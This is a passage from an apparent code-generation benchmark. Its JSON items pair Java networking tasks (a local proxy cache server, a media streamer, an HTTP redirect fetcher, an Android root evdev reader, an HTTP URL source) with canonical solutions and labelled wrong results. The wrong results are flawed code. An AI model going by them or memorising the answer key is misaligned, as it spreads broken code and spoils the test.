accepts incoming connections and delegates processing\nprocessSocket: [void]([Socket socket]) -> [void] - Processes an individual client socket connection\ngetClients: [HttpProxyCacheServerClients]([String url]) -> [HttpProxyCacheServerClients] - Retrieves or creates client handler for a URL\nreleaseSocket: [void]([Socket socket]) -> [void] - Properly closes and releases socket resources\ncloseSocketInput: [void]([Socket socket]) -> [void] - Closes socket input stream\ncloseSocketOutput: [void]([Socket socket]) -> [void] - Closes socket output stream\ncloseSocket: [void]([Socket socket]) -> [void] - Closes the socket connection\nonError: [void]([Throwable e]) -> [void] - Handles errors during server operation\nWaitRequestsRunnable: [Class] - Inner class implementing connection waiting logic\nSocketProcessorRunnable: [Class] - Inner class implementing socket processing logic",
    "Canonical_solution": "import android.content.Context;\nimport java.io.File;\nimport java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.util.Locale;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class HttpProxyCacheServer {\n\n    private static final String PROXY_HOST = \"127.0.0.1\";\n\n    private final Object clientsLock = new Object();\n    private final ExecutorService socketProcessor = Executors.newFixedThreadPool(8);\n    private final Map<String, HttpProxyCacheServerClients> clientsMap = new ConcurrentHashMap<>();\n    private final ServerSocket serverSocket;\n    private final int port;\n    private final Thread waitConnectionThread;\n    private final Config config;\n\n    public HttpProxyCacheServer(Context context) {\n        this(new Builder(context).buildConfig());\n    }\n\n    private HttpProxyCacheServer(Config config) {\n        this.config = config;\n        try {\n            InetAddress inetAddress = InetAddress.getByName(PROXY_HOST);\n            this.serverSocket = new ServerSocket(0, 8, inetAddress);\n            this.port = serverSocket.getLocalPort();\n            CountDownLatch startSignal = new CountDownLatch(1);\n            this.waitConnectionThread = new Thread(new WaitRequestsRunnable(startSignal));\n            this.waitConnectionThread.start();\n            startSignal.await();\n        } catch (IOException | InterruptedException e) {\n            socketProcessor.shutdown();\n            throw new IllegalStateException(\"Error starting local proxy server\", e);\n        }\n    }\n\n    private void waitForRequest() {\n        try {\n            while (!Thread.currentThread().isInterrupted()) {\n                Socket socket = serverSocket.accept();\n                socketProcessor.submit(new SocketProcessorRunnable(socket));\n            }\n        } catch (IOException e) {\n            onError(new ProxyCacheException(\"Error during waiting connection\", e));\n        }\n    }\n\n    private void processSocket(Socket socket) {\n        try {\n            GetRequest request = GetRequest.read(socket.getInputStream());\n            String url = ProxyCacheUtils.decode(request.uri);\n            HttpProxyCacheServerClients clients = getClients(url);\n            clients.processRequest(request, socket);\n        } catch (SocketException e) {\n            // Client closed connection\n        } catch (ProxyCacheException | IOException e) {\n            onError(new ProxyCacheException(\"Error processing request\", e));\n        } finally {\n            releaseSocket(socket);\n        }\n    }\n\n    private HttpProxyCacheServerClients getClients(String url) throws ProxyCacheException {\n        synchronized (clientsLock) {\n            HttpProxyCacheServerClients clients = clientsMap.get(url);\n            if (clients == null) {\n                clients = new HttpProxyCacheServerClients(url, config);\n                clientsMap.put(url, clients);\n            }\n            return clients;\n        }\n    }\n\n    private void releaseSocket(Socket socket) {\n        closeSocketInput(socket);\n        closeSocketOutput(socket);\n        closeSocket(socket);\n    }\n\n    private void closeSocketInput(Socket socket) {\n        try {\n            if (!socket.isInputShutdown()) {\n                socket.shutdownInput();\n            }\n        } catch (IOException e) {\n            onError(new ProxyCacheException(\"Error closing socket input stream\", e));\n        }\n    }\n\n    private void closeSocketOutput(Socket socket) {\n        try {\n            if (!socket.isOutputShutdown()) {\n                socket.shutdownOutput();\n            }\n        } catch (IOException e) {\n            onError(new ProxyCacheException(\"Error closing socket output stream\", e));\n        }\n    }\n\n    private void closeSocket(Socket socket) {\n        try {\n            if (!socket.isClosed()) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            onError(new ProxyCacheException(\"Error closing socket\", e));\n        }\n    }\n\n    private void onError(Throwable e) {\n        // Error handling\n    }\n\n    private final class WaitRequestsRunnable implements Runnable {\n        private final CountDownLatch startSignal;\n\n        public WaitRequestsRunnable(CountDownLatch startSignal) {\n            this.startSignal = startSignal;\n        }\n\n        @Override\n        public void run() {\n            startSignal.countDown();\n            waitForRequest();\n        }\n    }\n\n    private final class SocketProcessorRunnable implements Runnable {\n        private final Socket socket;\n\n        public SocketProcessorRunnable(Socket socket) {\n            this.socket = socket;\n        }\n\n        @Override\n        public void run() {\n            processSocket(socket);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.Map;\nimport java.util.concurrent.*;\n\npublic class HttpProxyCacheServer {\n    private final Object clientsLock = new Object();\n    private final ExecutorService socketProcessor = Executors.newCachedThreadPool();\n    private final Map<String, HttpProxyCacheServerClients> clientsMap = new ConcurrentHashMap<>();\n    private ServerSocket serverSocket;\n    private int port;\n    private Thread waitConnectionThread;\n    private Config config;\n\n    public HttpProxyCacheServer(Context context) {\n        this.config = new Config();\n        this.port = config.getPort();\n    }\n\n    public HttpProxyCacheServer(Config config) {\n        this.config = config;\n        this.port = config.getPort();\n    }\n\n    public void waitForRequest() {\n        try {\n            serverSocket = new ServerSocket(port);\n            waitConnectionThread = new Thread(new WaitRequestsRunnable());\n            waitConnectionThread.start();\n        } catch (IOException e) {\n            onError(e);\n        }\n    }\n\n    public void processSocket(Socket socket) {\n        socketProcessor.submit(new SocketProcessorRunnable(socket));\n    }\n\n    public HttpProxyCacheServerClients getClients(String url) {\n        synchronized (clientsLock) {\n            if (!clientsMap.containsKey(url)) {\n                clientsMap.put(url, new HttpProxyCacheServerClients(url));\n            }\n            return clientsMap.get(url);\n        }\n    }\n\n    public void releaseSocket(Socket socket) {\n        closeSocketInput(socket);\n        closeSocketOutput(socket);\n        closeSocket(socket);\n    }\n\n    public void closeSocketInput(Socket socket) {\n        try {\n            if (socket != null && !socket.isInputShutdown()) {\n                socket.shutdownInput();\n            }\n        } catch (IOException e) {\n            onError(e);\n        }\n    }\n\n    public void closeSocketOutput(Socket socket) {\n        try {\n            if (socket != null && !socket.isOutputShutdown()) {\n                socket.shutdownOutput();\n            }\n        } catch (IOException e) {\n            onError(e);\n        }\n    }\n\n    public void closeSocket(Socket socket) {\n        try {\n            if (socket != null && !socket.isClosed()) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            onError(e);\n        }\n    }\n\n    public void onError(Throwable e) {\n        e.printStackTrace();\n    }\n\n    private class WaitRequestsRunnable implements Runnable {\n        @Override\n        public void run() {\n            while (!serverSocket.isClosed()) {\n                try {\n                    Socket socket = serverSocket.accept();\n                    processSocket(socket);\n                } catch (IOException e) {\n                    onError(e);\n                }\n            }\n        }\n    }\n\n    private class SocketProcessorRunnable implements Runnable {\n        private final Socket socket;\n\n        public SocketProcessorRunnable(Socket socket) {\n            this.socket = socket;\n        }\n\n        @Override\n        public void run() {\n            try {\n                InputStream input = socket.getInputStream();\n                OutputStream output = socket.getOutputStream();\n\n                byte[] requestBytes = new byte[1024];\n                int bytesRead = input.read(requestBytes);\n                String request = new String(requestBytes, 0, bytesRead);\n\n                String[] requestLines = request.split(\"\\r\\n\");\n                String firstLine = requestLines[0];\n                String[] parts = firstLine.split(\" \");\n                String method = parts[0];\n                String url = parts[1];\n\n                HttpProxyCacheServerClients client = getClients(url);\n                if (client != null) {\n                    client.processRequest(method, url, input, output);\n                } else {\n                    output.write(\"HTTP/1.1 500 Internal Server Error\\r\\n\\r\\n\".getBytes());\n                }\n\n                releaseSocket(socket);\n            } catch (IOException e) {\n                onError(e);\n            }\n        }\n    }\n}\n\nclass HttpProxyCacheServerClients {\n    private final String url;\n\n    public HttpProxyCacheServerClients(String url) {\n        this.url = url;\n    }\n\n    public void processRequest(String method, String url, InputStream input, OutputStream output) throws IOException {\n        if (\"GET\".equals(method)) {\n            String response = \"HTTP/1.1 200 OK\\r\\nContent-Type: text/plain\\r\\n\\r\\nHello from proxy cache!\";\n            output.write(response.getBytes());\n        } else {\n            String response = \"HTTP/1.1 405 Method Not Allowed\\r\\n\\r\\n\";\n            output.write(response.getBytes());\n        }\n    }\n}\n\nclass Config {\n    private int port = 8080;\n\n    public int getPort() {\n        return port;\n    }\n}\n\nclass Context {\n    // Placeholder for context object\n}\n```"
  },
  {
    "Task_id": 524,
    "Instruction": "Task Description: Create a Java class that implements an HTTP media streaming server capable of serving files over a local network connection using TCP sockets.\n\nClass Description: The HttpMediaStreamer class provides functionality to stream media files over HTTP protocol. It creates a local server socket, handles incoming client connections, and streams the requested file with proper HTTP headers. The class manages the server lifecycle and provides access to the streaming URI.\n\nAttributes:\n- uri: Uri - The URI pointing to the local HTTP streaming endpoint\n- serverSocket: ServerSocket - The server socket instance used for listening to client connections\n- TAG: String - Constant for logging purposes (class name)\n\nMethods:\n- HttpMediaStreamer(String filename, String mimeType) -> [Constructor] - Initializes the streamer with the file to serve and its MIME type\n- getUri() -> Uri - Returns the streaming URI for the hosted file\n- destroy() -> void - Closes the server socket and cleans up resources\n- create(String filename, String mimeType) -> Uri - Internal method that sets up the server socket and starts the streaming thread",
    "Canonical_solution": "import info.guardianproject.iocipher.File;\nimport info.guardianproject.iocipher.FileInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport android.net.Uri;\nimport android.util.Log;\n\npublic class HttpMediaStreamer {\n    private static final String TAG = HttpMediaStreamer.class.getSimpleName();\n    private Uri uri;\n    private ServerSocket serverSocket;\n\n    public HttpMediaStreamer(String filename, String mimeType) throws IOException {\n        uri = create(filename, mimeType);\n    }\n\n    public Uri getUri() {\n        return uri;\n    }\n\n    public void destroy() {\n        try {\n            if (serverSocket != null)\n                serverSocket.close();\n        } catch (Exception e) {\n        }\n    }\n\n    private Uri create(final String filename, final String mimeType) throws IOException {\n        final File file = new File(filename);\n        if (!file.exists()) {\n            throw new IOException(\"File not found \" + filename);\n        }\n\n        try {\n            if (serverSocket != null)\n                serverSocket.close();\n        } catch (Exception e) {\n        }\n\n        serverSocket = new ServerSocket(0);\n        new Thread() {\n            public void run() {\n                try {\n                    while (true) {\n                        Socket socket = serverSocket.accept();\n                        byte[] b = new byte[8192];\n                        int len;\n\n                        InputStream is = socket.getInputStream();\n                        StringBuilder isb = new StringBuilder();\n                        len = is.read(b);\n                        isb.append(new String(b));\n\n                        StringBuilder sb = new StringBuilder();\n                        sb.append(\"HTTP/1.1 200\\r\\n\");\n                        sb.append(\"Content-Type: \" + mimeType + \"\\r\\n\");\n                        sb.append(\"Content-Length: \" + file.length() + \"\\r\\n\\r\\n\");\n\n                        BufferedOutputStream bos = new BufferedOutputStream(socket.getOutputStream());\n                        bos.write(sb.toString().getBytes());\n\n                        FileInputStream fis = new FileInputStream(file);\n                        int idx = 0;\n\n                        while ((len = fis.read(b)) != -1) {\n                            bos.write(b, 0, len);\n                            idx += len;\n                            Log.d(TAG, \"sharing via stream: \" + idx);\n                        }\n\n                        fis.close();\n                        bos.flush();\n                        bos.close();\n                        socket.close();\n                    }\n                } catch (IOException e) {\n                    Log.d(TAG, \"web share error\", e);\n                }\n            }\n        }.start();\n\n        Uri uri = Uri.parse(\"http://localhost:\" + serverSocket.getLocalPort() + file.getAbsolutePath());\n        return uri;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class HttpMediaStreamer {\n    private final Uri uri;\n    private final ServerSocket serverSocket;\n    private static final String TAG = \"HttpMediaStreamer\";\n\n    public HttpMediaStreamer(String filename, String mimeType) {\n        this.uri = create(filename, mimeType);\n        this.serverSocket = null;\n    }\n\n    public Uri getUri() {\n        return uri;\n    }\n\n    public void destroy() {\n        try {\n            if (serverSocket != null && !serverSocket.isClosed()) {\n                serverSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private Uri create(String filename, String mimeType) {\n        int port = 8080;\n        try {\n            serverSocket = new ServerSocket(port);\n            new Thread(() -> {\n                while (!Thread.currentThread().isInterrupted()) {\n                    try {\n                        Socket clientSocket = serverSocket.accept();\n                        new Thread(() -> {\n                            try {\n                                InputStream fileInputStream = new FileInputStream(filename);\n                                OutputStream clientOutputStream = clientSocket.getOutputStream();\n                                PrintWriter writer = new PrintWriter(clientOutputStream, true);\n                                writer.println(\"HTTP/1.1 200 OK\");\n                                writer.println(\"Content-Type: \" + mimeType);\n                                writer.println(\"Content-Length: \" + new File(filename).length());\n                                writer.println(\"Connection: close\");\n                                writer.println();\n                                byte[] buffer = new byte[4096];\n                                int bytesRead;\n                                while ((bytesRead = fileInputStream.read(buffer)) != -1) {\n                                    clientOutputStream.write(buffer, 0, bytesRead);\n                                }\n                                clientOutputStream.flush();\n                                clientSocket.close();\n                            } catch (Exception e) {\n                                e.printStackTrace();\n                            }\n                        }).start();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                        break;\n                    }\n                }\n            }).start();\n            return new Uri(\"http://localhost:\" + port);\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n}"
  },
  {
    "Task_id": 53,
    "Instruction": "Task Description: Create a function that retrieves content from a given HTTP/HTTPS URL and handles redirects with proper cookie management.\n\nFunction Description: The function establishes an HTTP connection to the specified URL, follows redirects (up to 10 times), maintains cookies during redirects, and returns the input stream of the final response. It handles standard HTTP response codes and supports common request headers.\n\nInput: \n- urlStr: String - The URL string to fetch content from (must start with \"http://\" or \"https://\")\n\nOutput: \n- InputStream - The input stream containing the response data from the final URL after following redirects, or null if:\n  - The URL scheme is not HTTP/HTTPS\n  - An exception occurs during the process\n  - Maximum redirect count (10) is exceeded",
    "Canonical_solution": "import java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\nprivate InputStream getKmlContents(String urlStr) {\n    InputStream inputStream;\n    try {\n        if (urlStr.startsWith(\"http://\") || urlStr.startsWith(\"https://\")) {\n            URL url = new URL(urlStr);\n            boolean redirect = true;\n            HttpURLConnection http = null;\n            String cookies = null;\n            int redirectCnt = 0;\n            while(redirect && redirectCnt < 10) {\n                redirect = false;\n                http = (HttpURLConnection)url.openConnection();\n                http.setRequestMethod(\"GET\");\n                if (cookies != null) {\n                    http.setRequestProperty(\"Cookie\", cookies);\n                }\n                http.addRequestProperty(\"Accept-Language\", \"en-US,en;q=0.8\");\n                http.addRequestProperty(\"User-Agent\", \"Mozilla\");\n                http.setInstanceFollowRedirects(true);\n                HttpURLConnection.setFollowRedirects(true);\n\n                int status = http.getResponseCode();\n                if (status != HttpURLConnection.HTTP_OK) {\n                    if (status == HttpURLConnection.HTTP_MOVED_TEMP\n                        || status == HttpURLConnection.HTTP_MOVED_PERM\n                        || status == HttpURLConnection.HTTP_SEE_OTHER)\n                        redirect = true;\n                }\n                if (redirect) {\n                    url = new URL(http.getHeaderField(\"Location\"));\n                    cookies = http.getHeaderField(\"Set-Cookie\");\n                    http.disconnect();\n                    redirectCnt++;\n                }\n            }\n            inputStream = http.getInputStream();\n        } else {\n            // Handle other URL types (file://, etc)\n            return null;\n        }\n    } catch (Exception e) {\n        e.printStackTrace();\n        return null;\n    }\n    return inputStream;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.InputStream;\nimport java.net.*;\nimport java.util.*;\n\npublic class HttpFetcher {\n    public static InputStream fetch(String urlStr) {\n        if (!urlStr.startsWith(\"http://\") && !urlStr.startsWith(\"https://\")) {\n            return null;\n        }\n\n        try {\n            URL url = new URL(urlStr);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setInstanceFollowRedirects(false);\n            connection.setRequestProperty(\"User-Agent\", \"Mozilla/5.0\");\n            connection.setRequestProperty(\"Accept\", \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\");\n            connection.setRequestProperty(\"Accept-Language\", \"en-US,en;q=0.5\");\n            connection.setRequestProperty(\"Accept-Encoding\", \"gzip,deflate\");\n            connection.setRequestProperty(\"Connection\", \"keep-alive\");\n\n            int redirectCount = 0;\n            while (redirectCount < 10) {\n                int responseCode = connection.getResponseCode();\n                if (responseCode == HttpURLConnection.HTTP_MOVED_TEMP || responseCode == HttpURLConnection.HTTP_MOVED_PERM || responseCode == HttpURLConnection.HTTP_SEE_OTHER) {\n                    String location = connection.getHeaderField(\"Location\");\n                    if (location == null) {\n                        return null;\n                    }\n                    URL nextUrl = new URL(new URL(urlStr), location);\n                    connection = (HttpURLConnection) nextUrl.openConnection();\n                    connection.setInstanceFollowRedirects(false);\n                    connection.setRequestProperty(\"User-Agent\", \"Mozilla/5.0\");\n                    connection.setRequestProperty(\"Accept\", \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\");\n                    connection.setRequestProperty(\"Accept-Language\", \"en-US,en;q=0.5\");\n                    connection.setRequestProperty(\"Accept-Encoding\", \"gzip,deflate\");\n                    connection.setRequestProperty(\"Connection\", \"keep-alive\");\n                    redirectCount++;\n                } else {\n                    return connection.getInputStream();\n                }\n            }\n            return null;\n        } catch (Exception e) {\n            return null;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 535,
    "Instruction": "Task Description: Implement an Android input capture provider that uses TCP socket communication to interface with a native evdev reader process for handling input events from rooted devices.\n\nClass Description: EvdevCaptureProvider is an Android input capture implementation that establishes a TCP server to communicate with a native evdev reader process running with root privileges. It handles input event capture and forwarding while managing the lifecycle of the socket connection and root process.\n\nAttributes:\n- listener: [EvdevListener] - Callback interface for handling input events\n- libraryPath: [String] - Path to the native library directory\n- shutdown: [boolean] - Flag indicating whether the provider should terminate\n- evdevIn: [InputStream] - Input stream from the evdev reader socket\n- evdevOut: [OutputStream] - Output stream to the evdev reader socket\n- su: [Process] - Root process running the evdev reader\n- servSock: [ServerSocket] - TCP server socket for accepting connections\n- evdevSock: [Socket] - Socket connection to the evdev reader\n- activity: [Activity] - Android activity context\n- started: [boolean] - Flag indicating if the provider has started\n- handlerThread: [Thread] - Thread handling the socket communication\n\nMethods:\n- EvdevCaptureProvider([Activity activity, EvdevListener listener]) -> [void] - Constructor that initializes the capture provider with activity context and event listener\n- destroy() -> [void] - Cleans up resources including sockets, streams, and terminates the root process\n- reportDeviceNotRooted() -> [void] - Displays a toast message when the device isn't rooted (private helper method)\n- run() -> [void] - Thread implementation that establishes the server socket, launches the root process, and handles event reading (inner Thread class method)",
    "Canonical_solution": "import android.app.Activity;\nimport android.os.Build;\nimport android.os.Looper;\nimport android.widget.Toast;\n\nimport com.limelight.LimeLog;\nimport com.limelight.binding.input.capture.InputCaptureProvider;\n\nimport java.io.DataOutputStream;\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class EvdevCaptureProvider extends InputCaptureProvider {\n\n    private final EvdevListener listener;\n    private final String libraryPath;\n\n    private boolean shutdown = false;\n    private InputStream evdevIn;\n    private OutputStream evdevOut;\n    private Process su;\n    private ServerSocket servSock;\n    private Socket evdevSock;\n    private Activity activity;\n    private boolean started = false;\n\n    private static final byte UNGRAB_REQUEST = 1;\n    private static final byte REGRAB_REQUEST = 2;\n\n    private final Thread handlerThread = new Thread() {\n        @Override\n        public void run() {\n            try {\n                servSock = new ServerSocket(0, 1);\n            } catch (IOException e) {\n                e.printStackTrace();\n                return;\n            }\n\n            final String evdevReaderCmd = libraryPath+File.separatorChar+\"libevdev_reader.so \"+servSock.getLocalPort();\n\n            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {\n                try {\n                    su = new ProcessBuilder(\"su\", \"-c\", evdevReaderCmd).start();\n                } catch (IOException e) {\n                    reportDeviceNotRooted();\n                    e.printStackTrace();\n                    return;\n                }\n            }\n            else {\n                ProcessBuilder builder = new ProcessBuilder(\"su\");\n                builder.redirectErrorStream(true);\n\n                try {\n                    su = builder.start();\n                } catch (IOException e) {\n                    reportDeviceNotRooted();\n                    e.printStackTrace();\n                    return;\n                }\n\n                DataOutputStream suOut = new DataOutputStream(su.getOutputStream());\n                try {\n                    suOut.writeChars(evdevReaderCmd+\"\\n\");\n                } catch (IOException e) {\n                    reportDeviceNotRooted();\n                    e.printStackTrace();\n                    return;\n                }\n            }\n\n            LimeLog.info(\"Waiting for EvdevReader connection to port \"+servSock.getLocalPort());\n            try {\n                evdevSock = servSock.accept();\n                evdevIn = evdevSock.getInputStream();\n                evdevOut = evdevSock.getOutputStream();\n            } catch (IOException e) {\n                e.printStackTrace();\n                return;\n            }\n            LimeLog.info(\"EvdevReader connected from port \"+evdevSock.getPort());\n\n            while (!isInterrupted() && !shutdown) {\n                EvdevEvent event;\n                try {\n                    event = EvdevReader.read(evdevIn);\n                } catch (IOException e) {\n                    event = null;\n                }\n                if (event == null) {\n                    break;\n                }\n            }\n        }\n    };\n\n    public EvdevCaptureProvider(Activity activity, EvdevListener listener) {\n        this.listener = listener;\n        this.activity = activity;\n        this.libraryPath = activity.getApplicationInfo().nativeLibraryDir;\n    }\n\n    private void reportDeviceNotRooted() {\n        activity.runOnUiThread(new Runnable() {\n            @Override\n            public void run() {\n                Toast.makeText(activity, \"This device is not rooted - Mouse capture is unavailable\", Toast.LENGTH_LONG).show();\n            }\n        });\n    }\n\n    @Override\n    public void destroy() {\n        if (!started) {\n            return;\n        }\n\n        shutdown = true;\n        handlerThread.interrupt();\n\n        if (servSock != null) {\n            try {\n                servSock.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        if (evdevSock != null) {\n            try {\n                evdevSock.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        if (evdevIn != null) {\n            try {\n                evdevIn.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        if (evdevOut != null) {\n            try {\n                evdevOut.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        if (su != null) {\n            su.destroy();\n        }\n\n        try {\n            handlerThread.join();\n        } catch (InterruptedException ignored) {}\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "```java\npublic class EvdevCaptureProvider {\n    private EvdevListener listener;\n    private String libraryPath;\n    private boolean shutdown;\n    private InputStream evdevIn;\n    private OutputStream evdevOut;\n    private Process su;\n    private ServerSocket servSock;\n    private Socket evdevSock;\n    private Activity activity;\n    private boolean started;\n    private Thread handlerThread;\n\n    public EvdevCaptureProvider(Activity activity, EvdevListener listener) {\n        this.activity = activity;\n        this.listener = listener;\n        this.libraryPath = \"/data/data/\" + activity.getPackageName() + \"/lib/\";\n        this.shutdown = false;\n        this.started = false;\n    }\n\n    public void destroy() {\n        shutdown = true;\n        try {\n            if (evdevSock != null) {\n                evdevSock.close();\n            }\n            if (servSock != null) {\n                servSock.close();\n            }\n            if (evdevIn != null) {\n                evdevIn.close();\n            }\n            if (evdevOut != null) {\n                evdevOut.close();\n            }\n            if (su != null) {\n                su.destroy();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void reportDeviceNotRooted() {\n        activity.runOnUiThread(() -> android.widget.Toast.makeText(activity, \"Device is not rooted\", android.widget.Toast.LENGTH_SHORT).show());\n    }\n\n    public void run() {\n        try {\n            servSock = new ServerSocket(0);\n            int port = servSock.getLocalPort();\n            String command = \"su -c \\\"\" + libraryPath + \"evdev_reader \" + port + \"\\\"\";\n            su = Runtime.getRuntime().exec(command);\n            evdevSock = servSock.accept();\n            evdevIn = evdevSock.getInputStream();\n            evdevOut = evdevSock.getOutputStream();\n            started = true;\n            while (!shutdown) {\n                byte[] buffer = new byte[256];\n                int bytesRead = evdevIn.read(buffer);\n                if (bytesRead > 0) {\n                    listener.onEvent(buffer, bytesRead);\n                }\n            }\n        } catch (Exception e) {\n            reportDeviceNotRooted();\n        } finally {\n            destroy();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 54,
    "Instruction": "Task Description: Implement a Java class that handles HTTP URL connections for streaming content with support for caching, custom headers, and partial content requests.\n\nClass Description: HttpUrlSource is a class designed to manage HTTP connections for streaming media content. It supports range requests, handles redirects, injects custom headers, and caches source information (URL, content length, MIME type). The class provides methods to open, read, and close connections while managing connection timeouts and redirects.\n\nAttributes:\n\nsourceInfoStorage: [SourceInfoStorage] - Storage for caching source information (URL, length, MIME type)\nheaderInjector: [HeaderInjector] - Injects custom headers into HTTP requests\nsourceInfo: [SourceInfo] - Contains information about the media source (URL, length, MIME type)\nconnection: [HttpURLConnection] - Active HTTP connection\ninputStream: [InputStream] - Input stream for reading content\n\nMethods:\n\nlength(): [long] - Returns the content length of the source, fetching it if not already cached\nopen([long] offset) -> [void] - Opens a connection to the source with optional byte offset\nclose() -> [void] - Closes the current connection\nread([byte[]] buffer) -> [int] - Reads data from the input stream into the buffer\ngetMime() -> [String] - Returns the MIME type of the source, fetching it if not already cached\ngetUrl() -> [String] - Returns the source URL\nfetchContentInfo() -> [void] - Fetches and caches content information (length and MIME type)\nopenConnection([long] offset, [int] timeout) -> [HttpURLConnection] - Opens a connection with optional offset and timeout, handling redirects\ninjectCustomHeaders([HttpURLConnection] connection, [String] url) -> [void] - Injects custom headers into the connection\nreadSourceAvailableBytes([HttpURLConnection] connection, [long] offset, [int] responseCode) -> [long] - Calculates available bytes based on response code\ngetContentLength([HttpURLConnection] connection) -> [long] - Extracts content length from connection headers",
    "Canonical_solution": "import android.text.TextUtils;\nimport com.danikula.videocache.headers.HeaderInjector;\nimport com.danikula.videocache.sourcestorage.SourceInfoStorage;\nimport java.io.BufferedInputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InterruptedIOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\nimport static com.danikula.videocache.Preconditions.checkNotNull;\nimport static com.danikula.videocache.ProxyCacheUtils.DEFAULT_BUFFER_SIZE;\nimport static java.net.HttpURLConnection.HTTP_MOVED_PERM;\nimport static java.net.HttpURLConnection.HTTP_MOVED_TEMP;\nimport static java.net.HttpURLConnection.HTTP_OK;\nimport static java.net.HttpURLConnection.HTTP_PARTIAL;\nimport static java.net.HttpURLConnection.HTTP_SEE_OTHER;\n\npublic class HttpUrlSource {\n\n    private static final int MAX_REDIRECTS = 5;\n    private final SourceInfoStorage sourceInfoStorage;\n    private final HeaderInjector headerInjector;\n    private SourceInfo sourceInfo;\n    private HttpURLConnection connection;\n    private InputStream inputStream;\n\n    public HttpUrlSource(String url, SourceInfoStorage sourceInfoStorage, HeaderInjector headerInjector) {\n        this.sourceInfoStorage = checkNotNull(sourceInfoStorage);\n        this.headerInjector = checkNotNull(headerInjector);\n        SourceInfo sourceInfo = sourceInfoStorage.get(url);\n        this.sourceInfo = sourceInfo != null ? sourceInfo :\n                new SourceInfo(url, Integer.MIN_VALUE, ProxyCacheUtils.getSupposablyMime(url));\n    }\n\n    public synchronized long length() throws ProxyCacheException {\n        if (sourceInfo.length == Integer.MIN_VALUE) {\n            fetchContentInfo();\n        }\n        return sourceInfo.length;\n    }\n\n    public void open(long offset) throws ProxyCacheException {\n        try {\n            connection = openConnection(offset, -1);\n            String mime = connection.getContentType();\n            inputStream = new BufferedInputStream(connection.getInputStream(), DEFAULT_BUFFER_SIZE);\n            long length = readSourceAvailableBytes(connection, offset, connection.getResponseCode());\n            this.sourceInfo = new SourceInfo(sourceInfo.url, length, mime);\n            this.sourceInfoStorage.put(sourceInfo.url, sourceInfo);\n        } catch (IOException e) {\n            throw new ProxyCacheException(\"Error opening connection for \" + sourceInfo.url + \" with offset \" + offset, e);\n        }\n    }\n\n    private long readSourceAvailableBytes(HttpURLConnection connection, long offset, int responseCode) throws IOException {\n        long contentLength = getContentLength(connection);\n        return responseCode == HTTP_OK ? contentLength\n                : responseCode == HTTP_PARTIAL ? contentLength + offset : sourceInfo.length;\n    }\n\n    private long getContentLength(HttpURLConnection connection) {\n        String contentLengthValue = connection.getHeaderField(\"Content-Length\");\n        return contentLengthValue == null ? -1 : Long.parseLong(contentLengthValue);\n    }\n\n    public void close() throws ProxyCacheException {\n        if (connection != null) {\n            try {\n                connection.disconnect();\n            } catch (NullPointerException | IllegalArgumentException e) {\n                throw new RuntimeException(\"Error closing connection\", e);\n            }\n        }\n    }\n\n    public int read(byte[] buffer) throws ProxyCacheException {\n        if (inputStream == null) {\n            throw new ProxyCacheException(\"Error reading data from \" + sourceInfo.url + \": connection is absent!\");\n        }\n        try {\n            return inputStream.read(buffer, 0, buffer.length);\n        } catch (InterruptedIOException e) {\n            throw new InterruptedProxyCacheException(\"Reading source \" + sourceInfo.url + \" is interrupted\", e);\n        } catch (IOException e) {\n            throw new ProxyCacheException(\"Error reading data from \" + sourceInfo.url, e);\n        }\n    }\n\n    private void fetchContentInfo() throws ProxyCacheException {\n        HttpURLConnection urlConnection = null;\n        InputStream inputStream = null;\n        try {\n            urlConnection = openConnection(0, 10000);\n            long length = getContentLength(urlConnection);\n            String mime = urlConnection.getContentType();\n            inputStream = urlConnection.getInputStream();\n            this.sourceInfo = new SourceInfo(sourceInfo.url, length, mime);\n            this.sourceInfoStorage.put(sourceInfo.url, sourceInfo);\n        } catch (IOException e) {\n            throw new ProxyCacheException(\"Error fetching info from \" + sourceInfo.url, e);\n        } finally {\n            ProxyCacheUtils.close(inputStream);\n            if (urlConnection != null) {\n                urlConnection.disconnect();\n            }\n        }\n    }\n\n    private HttpURLConnection openConnection(long offset, int timeout) throws IOException, ProxyCacheException {\n        HttpURLConnection connection;\n        boolean redirected;\n        int redirectCount = 0;\n        String url = this.sourceInfo.url;\n        do {\n            connection = (HttpURLConnection) new URL(url).openConnection();\n            